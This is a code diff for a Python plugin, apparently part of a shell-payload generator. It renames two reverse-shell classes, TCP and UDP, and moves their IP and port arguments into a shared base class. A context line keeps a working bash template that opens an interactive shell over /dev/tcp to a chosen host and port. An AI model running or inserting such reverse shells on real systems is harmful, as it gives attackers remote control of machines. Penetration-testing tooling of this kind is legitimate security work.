@@ -1,7 +1,7 @@
 from ogabog.cores import plugin, const
 
 
-class ReverseShell(plugin.Module):
+class ReverseTCP(plugin.ReverseShell):
     def __init__(self):
         super().__init__()
         self.add_args(
@@ -9,16 +9,6 @@ class ReverseShell(plugin.Module):
             default="bash",
             choices=const.LINUX_SHELL,
             help="Select shell type on target machine"
-        )
-        self.add_args(
-            "--ip",
-            help="IP address",
-            required=True
-        )
-        self.add_args(
-            "--port",
-            help="Port address",
-            required=True
         )
         self.opts.description = "[ReverseShell][TCP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
 
@@ -26,7 +16,7 @@ class ReverseShell(plugin.Module):
         self.shell = "{} -i >& /dev/tcp/{}/{} 0>&1".format(self.args.shell, self.args.ip, self.args.port)
 
 
-class ReverseShellUDP(plugin.Module):
+class ReverseUDP(plugin.ReverseShell):
     def __init__(self):
         super().__init__()
         self.add_args(
@@ -34,16 +24,6 @@ class ReverseShellUDP(plugin.Module):
             default="bash",
             choices=const.LINUX_SHELL,
             help="Select shell type on target machine"
-        )
-        self.add_args(
-            "--ip",
-            help="IP address",
-            required=True
-        )
-        self.add_args(
-            "--port",
-            help="Port address",
-            required=True
         )
         self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
 
